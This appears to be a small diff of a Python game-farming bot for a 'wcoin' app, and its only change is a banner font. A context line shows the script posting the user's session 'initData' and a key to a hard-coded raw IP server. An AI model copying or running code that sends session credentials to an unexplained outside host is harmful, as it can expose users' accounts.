@@ -43,7 +43,7 @@ def main_wcoin(session ,amount, key):
     r = requests.post('http://77.37.63.209:5000/api',json={'initData':session,'serverData':res,'amount':amount,'key':key})
     return (r.json())
 def create_gradient_banner(text):
-    banner = pyfiglet.figlet_format(text,font='slant').splitlines()
+    banner = pyfiglet.figlet_format(text).splitlines()
     colors = [Fore.GREEN + Style.BRIGHT, Fore.YELLOW + Style.BRIGHT, Fore.RED + Style.BRIGHT]
     total_lines = len(banner)
     section_size = total_lines // len(colors)
